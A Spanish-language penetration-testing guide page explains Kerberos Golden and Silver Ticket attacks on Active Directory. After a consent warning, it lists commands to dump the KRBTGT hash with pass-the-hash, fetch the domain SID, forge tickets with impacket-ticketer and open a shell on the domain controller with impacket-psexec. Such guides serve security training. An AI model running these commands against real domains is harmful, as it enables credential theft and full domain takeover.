
# Golden y Silver Tickets

Consiste en construirnos nuestros propios TGT y Tickets de servicio. Para ello se necesita el hash del usuario KRBTGT y su clave de sesión.

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a conseguir credenciales y información sensible en una organización por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Golden Ticket en Kerberos</mark>

Un Golden Ticket es un objeto criptográfico que se utiliza para autenticar a un usuario <mark style="color:purple;">en cualquier sistema y aplicación</mark> del entorno de Active Directory. Un atacante puede obtener un Golden Ticket válido si tiene acceso a la clave secreta del servicio de dominio (KRBTGT), que se utiliza para cifrar los tickets de autenticación en el entorno de Active Directory. Una vez que un atacante tiene acceso a la clave secreta del servicio KRBTGT, puede generar Golden Tickets para cualquier usuario y utilizarlos para acceder a cualquier sistema y aplicación del entorno de Active Directory, sin necesidad de conocer las credenciales reales del usuario.

#### 1- Volcado de SAM con hash administrador

{% code title="En Kali Linux" %}

```
impacket-secretsdump administrador@IP_DC -hashes :a87f3a337d73085c45f9416be5787d86
```

{% endcode %}

* Copiar el hash NTLM del usuario KRBTGT, que es la segunda cadena de texto

{% code title="Hash NTLM de admin" %}

```
8ac33421f2680ad732aeaaf390e2c52f
```

{% endcode %}

#### 2- Obtener el Domain SID

* Se puede obtener de muchas maneras, powerview, etc…

{% code title="Windows de empleado" %}

```
Get-ADDomain
```

{% endcode %}

{% code title="Domain SID" %}

```
S-1-5-21-2517959985-1707262012-4014264569
```

{% endcode %}

#### 3- Crear TGT uniendo todo

{% code title="Kali Linux" %}

```csharp
impacket-ticketer -nthash 8ac33421f2680ad732aeaaf390e2c52f -domain-sid S-1-5-21-2517959985-1707262012-4014264569 -domain corp.local administrador
# Nos vuelca el ticket en administrador.ccache
export KRB5CCNAME=/home/kali/Escritorio/hashes/administrador.ccache
impacket-psexec corp.local/administrador@DC01.corp.local -k -no-pass
```

{% endcode %}

## <mark style="color:purple;">Silver Ticket en Kerberos</mark>

Un Silver Ticket es un objeto criptográfico que se utiliza para autenticar a un usuario <mark style="color:purple;">en un servicio de red específico</mark>. Un atacante puede obtener un Silver Ticket válido si tiene acceso a la clave secreta del servicio específico y puede generar un ticket de autenticación válido para ese servicio. Una vez que un atacante tiene un Silver Ticket válido, puede utilizarlo para acceder a ese servicio de red específico, sin necesidad de conocer las credenciales reales del usuario.

{% code title="Kali Linux" %}

```
impacket-ticketer -nthash 8ac33421f2680ad732aeaaf390e2c52f -domain-sid S-1-5-21-2517959985-1707262012-4014264569 -domain  corp.local -spn cifs/DC01.corp.local administrador
```

{% endcode %}

* Nos da ticket de servicio para un servicio específico, en este caso para el sistema de archivos CIFS del DC01
